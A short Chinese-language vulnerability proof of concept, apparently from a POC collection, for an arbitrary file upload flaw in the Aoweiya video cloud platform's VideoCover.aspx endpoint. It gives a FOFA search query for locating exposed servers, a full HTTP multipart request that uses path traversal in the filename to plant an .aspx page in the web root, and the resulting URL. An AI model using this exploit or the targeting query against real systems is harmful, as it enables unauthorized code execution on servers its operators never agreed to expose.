## 奥威亚视频云平台VideoCover.aspx接口存在任意文件上传漏洞

## fofa
```
body="/Upload/DomainInfo/MaxAVALogo.png"
```

## poc
```
POST /Tools/Video/VideoCover.aspx HTTP/1.1
Host: xxxxx
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insectre-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 1015 7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/107.0.0.0 Safari 537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avifimage/webp,image/apng,*/*;q=0.8,application/signed-exchangev=b3;q=0.9
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,zh;g=0.9
Cookie: ASP.NET_SessionId=pgfnw0patx4kh0jsnpjgzcmq; PrivateKey=f09020eaf656f9cf5d9292d39c296d1c
Connection: close
Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M
Content-Length: 294
 
------WebKitFormBoundaryVBf7Cs8QWsfwC82M
Content-Disposition: form-data, name= "file";filename="/../../../AVA.ResourcesPlatform.WebUI/test.aspx"
Content-Type: image/jpeg
 
<%@Page Language="C#"%>
<%
Response.Write("test");
%>
------WebKitFormBoundaryVBf7Cs8QWsfwC82M--
```
![image](https://github.com/wy876/POC/assets/139549762/d0ffa0f8-63dc-44e5-8711-d64d16ce9653)

上传后的路径：http://127.0.0.1/test.aspx


